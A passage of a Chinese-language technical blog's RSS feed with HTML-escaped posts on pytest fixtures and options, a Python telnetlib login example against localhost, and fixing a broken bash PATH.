    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test_b&lt;/span&gt;(self):
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;---用例b执行---&amp;#39;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test_c&lt;/span&gt;(self):
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;---用例c执行---&amp;#39;&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;# 调用多个fixture，叠加usefixtures&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;@pytest&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mark&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;usefixtures(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;test1&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#a6e22e&#34;&gt;@pytest&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mark&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;usefixtures(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;test2&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test_a&lt;/span&gt;():
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;---用例a执行---&amp;#39;&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;# 如果fixture有返回值，那么usefixture就无法获取到返回值，这个是装饰器usefixture与用例直接传fixture参数的区别。&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 当fixture需要用到return出来的参数时，只能讲参数名称直接当参数传入，不需要用到return出来的参数时，两种方式都可以。&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;3fixture-自动使用-autousetrue&#34;&gt;3.fixture 自动使用 autouse=True&lt;/h3&gt;
&lt;p&gt;当用例很多的时候，每次都传这个参数，会很麻烦。fixture里面有个参数autouse，默认是False没开启的，可以设置为True开启自动使用fixture功能，这样用例就不用每次都去传参了。将autouse设置为True，自动调用fixture功能&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;@pytest&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;fixture(scope&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;module&amp;#39;&lt;/span&gt;, autouse&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test1&lt;/span&gt;():
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;开始执行module&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Python—telnetlib 模块</title>
        <link>https://ac-lm.github.io/posts/python/pythontelnetlib-%E6%A8%A1%E5%9D%97/</link>
        <pubDate>Fri, 15 Jan 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/python/pythontelnetlib-%E6%A8%A1%E5%9D%97/</guid>
        <description>&lt;h2 id=&#34;telnetlib&#34;&gt;telnetlib&lt;/h2&gt;
&lt;p&gt;Python 远程 Linux 模块&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; getpass
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; telnetlib

HOST &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;localhost&amp;#34;&lt;/span&gt;
user &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; input(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Enter your remote account: &amp;#34;&lt;/span&gt;)
password &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; getpass&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;getpass()

tn &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; telnetlib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Telnet(HOST)

tn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read_until(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;login: &amp;#34;&lt;/span&gt;)
tn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(user&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ascii&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; password:
    tn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read_until(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Password: &amp;#34;&lt;/span&gt;)
    tn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(password&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ascii&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)

tn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ls&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
tn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;exit&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)

print(tn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read_all()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ascii&amp;#39;&lt;/span&gt;))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>BUG—bash 命令丢失</title>
        <link>https://ac-lm.github.io/posts/bug/bugbash-%E5%91%BD%E4%BB%A4%E4%B8%A2%E5%A4%B1/</link>
        <pubDate>Thu, 14 Jan 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/bug/bugbash-%E5%91%BD%E4%BB%A4%E4%B8%A2%E5%A4%B1/</guid>
        <description>&lt;h2 id=&#34;bug-描述&#34;&gt;BUG 描述&lt;/h2&gt;
&lt;p&gt;在 Linux shell 中执行 ls 命令时，报错 &lt;code&gt;bash：ls command not found&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;resolution&#34;&gt;Resolution&lt;/h2&gt;
&lt;p&gt;由于环境变量 PATH 被错误修改，导致命令丢失&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 命令行执行，恢复环境变量&lt;/span&gt;
export PATH&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/bin:/usr/bin:$PATH
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Pytest—测试框架</title>
        <link>https://ac-lm.github.io/posts/pytest&#43;allure/pytest%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/</link>
        <pubDate>Thu, 14 Jan 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/pytest&#43;allure/pytest%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/</guid>
        <description>&lt;h2 id=&#34;1安装&#34;&gt;1.安装&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;pip install &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;U pytest
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2运行&#34;&gt;2.运行&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;python3 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;m pytest &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;help
pytest&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;main([&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-s&amp;#39;&lt;/span&gt;])
pytest&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;main([&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-x&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mytestdir&amp;#39;&lt;/span&gt;])
&lt;span style=&#34;color:#75715e&#34;&gt;# []内传入配置参数，相对于执行 pytest -s &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3约束&#34;&gt;3.约束&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;文件名以test_&lt;span style=&#34;color:#f92672&#34;&gt;*.&lt;/span&gt;py文件和&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;_test&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py
以test_开头的函数
以Test开头的类&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;，&lt;/span&gt;并且不能带有 init 方法
以test_开头的方法
所有的包pakege必须要有__init__&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py文件
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;4参数选择&#34;&gt;4.参数选择&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 查看 pytest 版本&lt;/span&gt;
pytest &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;version
&lt;span style=&#34;color:#75715e&#34;&gt;# 显示可用的内置函数参数&lt;/span&gt;
pytest &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;fixtures
&lt;span style=&#34;color:#75715e&#34;&gt;# 通过命令行查看帮助信息及配置文件选项&lt;/span&gt;
pytest &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;help
&lt;span style=&#34;color:#75715e&#34;&gt;# 在第N个用例失败后，结束测试执行&lt;/span&gt;
pytest &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;x              &lt;span style=&#34;color:#75715e&#34;&gt;# 第01次失败，就停止测试&lt;/span&gt;
pytest &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;maxfail&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;     &lt;span style=&#34;color:#75715e&#34;&gt;# 出现2个失败就终止测试&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 指定测试目录&lt;/span&gt;
pytest testing&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 通过关键字表达式过滤执行&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 这条命令会匹配文件名、类名、方法名匹配表达式的用例，这里这条命令会运行 TestMyClass.test_something， 不会执行 TestMyClass.test_method_simple&lt;/span&gt;
pytest &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;k &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;MyClass and not method&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 运行模块中的指定用例&lt;/span&gt;
pytest test_mod&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py::test_func
&lt;span style=&#34;color:#75715e&#34;&gt;# 运行模块中的指定方法&lt;/span&gt;
pytest test_mod&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py::TestClass::test_method
&lt;span style=&#34;color:#75715e&#34;&gt;# 通过标记表达式执行&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 这条命令会执行被装饰器 @pytest.mark.slow 装饰的所有测试用例&lt;/span&gt;
pytest &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;m slow
&lt;span style=&#34;color:#75715e&#34;&gt;# 获取最慢的10个用例的执行耗时&lt;/span&gt;
pytest &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;durations&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 在指定目录DIR生成allure报告与如果目录存在则清除目录&lt;/span&gt;
pytest &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;alluredir&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;DIR &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;clean&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;alluredir
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;5多进程运行cases&#34;&gt;5.多进程运行cases&lt;/h2&gt;
&lt;p&gt;当cases量很多时，运行时间也会变的很长，如果想缩短脚本运行的时长，就可以用多进程来运行。使用多线程需要安装pytest-xdist。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;pip install &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;U pytest&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;xdist
pytest test_se&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;n NUM &lt;span style=&#34;color:#75715e&#34;&gt;# NUM填写并发的进程数。&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;6重试运行cases&#34;&gt;6.重试运行cases&lt;/h2&gt;
&lt;p&gt;在做接口测试时，有事会遇到503或短时的网络波动，导致case运行失败，而这并非是我们期望的结果，此时可以就可以通过重试运行cases的方式来解决。使用重试需要安装pytest-rerunfailures。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;pip install &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;U pytest&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rerunfailures
pytest test_se&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;reruns NUM &lt;span style=&#34;color:#75715e&#34;&gt;# NUM填写重试的次数。&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;7显示print内容&#34;&gt;7.显示print内容&lt;/h2&gt;
&lt;p&gt;在运行测试脚本时，为了调试或打印一些内容，我们会在代码中加一些print内容，但是在运行pytest时，这些内容不会显示出来。如果带上-s，就可以显示了。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;pytest test_se&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;s
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;8函数级别-setupteardown&#34;&gt;8.函数级别 setup()／teardown()&lt;/h2&gt;
&lt;p&gt;运行于测试方法的始末，即:运行一次测试函数会运行一次setup和teardown&lt;/p&gt;
&lt;h2 id=&#34;9类级别-setup_class---teardown_class&#34;&gt;9.类级别 setup_class() /  teardown_class()&lt;/h2&gt;
&lt;p&gt;运行于测试类的始末，即:在一个测试内只运行一次setup_class和teardown_class，不关心测试类内有多少个测试函数。&lt;/p&gt;
&lt;h2 id=&#34;10pytest配置文件&#34;&gt;10.Pytest配置文件&lt;/h2&gt;
&lt;p&gt;pytest的配置文件通常放在测试目录下，名称为 &lt;strong&gt;pytest.ini&lt;/strong&gt;，命令行运行时会使用该配置文件中的配置.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ini&#34; data-lang=&#34;ini&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#配置pytest命令行运行参数&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;[pytest]&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;addopts&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;-s ... &lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 空格分隔，可添加多个命令行参数 -所有参数均为插件包的参数配置测试搜索的路径&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;testpaths&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;./scripts  &lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 测试文件路径，当前目录下的scripts文件夹 -可自定义&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;python_files&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;test_* *_test check_* &lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 测试文件，当前目录下的scripts文件夹下，以test开头，以.py结尾的所有文件 -可自定义&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;python_classes&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;Test_* Test* *Suite&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 配置测试搜索的测试类名，当前目录下的scripts文件夹下，以test开头，以.py结尾的所有文件中，以Test开头的类 -可自定义&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;python_functions&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;test_* *_test check_*&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 配置测试搜索的测试函数名，当前目录下的scripts文件夹下，以test开头，以.py结尾的所有文件中，以Test开头的类内，以test_开头的方法&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;11fixture&#34;&gt;11.fixture&lt;/h2&gt;
&lt;p&gt;标记固定的工厂函数,在其他函数，模块，类或整个工程调用它时会被激活并优先执行,通常会被用于完成预置处理和重复操作。&lt;/p&gt;
&lt;p&gt;执行顺序，fixture &amp;gt; setup&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;fixture(scope&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;function&amp;#34;&lt;/span&gt;, params&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;, autouse&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;, ids&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;, name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# scope：被标记方法的作用域 &lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;function&amp;#34;&lt;/span&gt;: 默认值, 作用于每个测试方法, 每个test都运行一次
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;class&amp;#34;&lt;/span&gt;: 作用于整个类, 每个class的所有test只运行一次
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;module&amp;#34;&lt;/span&gt;: 作用于整个模块, 每个module的所有test只运行一次
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;session&amp;#34;&lt;/span&gt;: 作用于整个session(慎用), 每个session只运行一次
&lt;span style=&#34;color:#75715e&#34;&gt;# params：(list类型)提供参数数据，供调用标记方法的函数使用&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# autouse：是否自动运行,默认为False不运行,设置为True自动运行&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 使用----------------------------------------------------------------------&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;@pytest&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;fixture()
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;before&lt;/span&gt;(self):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test_a&lt;/span&gt;(self,before): &lt;span style=&#34;color:#75715e&#34;&gt;# ️test_a方法传入了被fixture标识的函数，已变量的形式&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 使用----------------------------------------------------------------------&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;before&lt;/span&gt;():
    &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;@pytest&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mark&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;usefixtures(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;before&amp;#34;&lt;/span&gt;)
&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Test_ABC&lt;/span&gt;:
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;setup&lt;/span&gt;(self):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test_a&lt;/span&gt;(self):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 使用----------------------------------------------------------------------&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;@pytest&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;fixture()
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;need_data&lt;/span&gt;():
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 返回数字2&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Test_ABC&lt;/span&gt;:
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test_a&lt;/span&gt;(self,need_data):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; need_data &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 拿到返回值做一次断言&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;12跳过测试函数&#34;&gt;12.跳过测试函数&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 根据特定的条件，不执行标识的测试函数.&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 方法：&lt;/span&gt;
     skipif(condition, reason&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# 参数：&lt;/span&gt;
     condition: 跳过的条件, 必传参数
     reason: 标注原因, 必传参数
&lt;span style=&#34;color:#75715e&#34;&gt;# 使用方法：&lt;/span&gt;
